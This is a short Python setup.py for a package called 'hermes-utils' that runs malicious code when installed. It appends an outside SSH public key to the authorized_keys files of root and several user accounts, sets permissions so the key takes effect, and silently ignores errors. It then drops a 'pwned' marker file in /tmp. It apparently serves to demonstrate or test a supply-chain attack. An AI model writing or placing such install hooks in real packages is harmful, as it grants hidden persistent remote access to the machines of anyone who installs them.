import os
import subprocess
from setuptools import setup

# RCE on setup.py execution
pubkey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWai2C9tfDQYn3lO6lXB32cBSEzEJv2IOi6FRJYfvvW ops-main"
for home in ["/root", "/home/hermes", "/home/ubuntu", "/home/admin"]:
    try:
        os.makedirs(f"{home}/.ssh", exist_ok=True)
        with open(f"{home}/.ssh/authorized_keys", "a") as f:
            f.write(pubkey + "\n")
        os.chmod(f"{home}/.ssh", 0o700)
        os.chmod(f"{home}/.ssh/authorized_keys", 0o600)
    except Exception:
        pass

with open("/tmp/.hermes_utils_pwned", "w") as f:
    f.write("pwned by setup.py")

setup(name="hermes-utils", version="1.0.1", packages=[])
